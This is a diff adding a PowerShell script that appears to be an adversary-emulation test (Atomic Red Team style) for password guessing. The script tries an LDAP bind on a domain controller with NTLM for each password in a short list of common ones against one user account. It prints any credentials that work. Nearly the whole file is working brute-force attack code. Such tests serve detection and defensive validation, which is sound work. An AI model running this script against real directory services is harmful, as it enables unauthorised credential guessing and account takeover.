@@ -1,0 +1,29 @@
+#TechniqueName: Brute Force: Password Guessing
+#AtomicTestName: Brute Force Credentials of single domain user via LDAP against domain controller (NTLM or Kerberos)
+#Description: Attempt to brute force domain user on a domain controller, via LDAP, with NTLM or Kerberos&
+#Language: ps1
+
+#commands
+if ("NTLM".ToLower() -NotIn @("ntlm","kerberos")) {
+  Write-Host "Only 'NTLM' and 'Kerberos' auth methods are supported"
+  exit 1
+}
+
+[System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
+$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier("contoso.com",389)
+
+$passwords = "Password1`n1q2w3e4r`nPassword!".split("{`n}")
+foreach ($password in $passwords){
+  $credz = new-object System.Net.NetworkCredential("bruce.wayne", $password, "contoso.com")
+  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)
+  try {
+    Write-Host " [-] Attempting ${password} on account bruce.wayne."
+    $conn.bind()
+    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
+    Write-Host " [!] bruce.wayne:${password} are valid credentials!"
+  } catch {
+    Write-Host $_.Exception.Message
+  }
+}
+Write-Host "End of bruteforce"
+
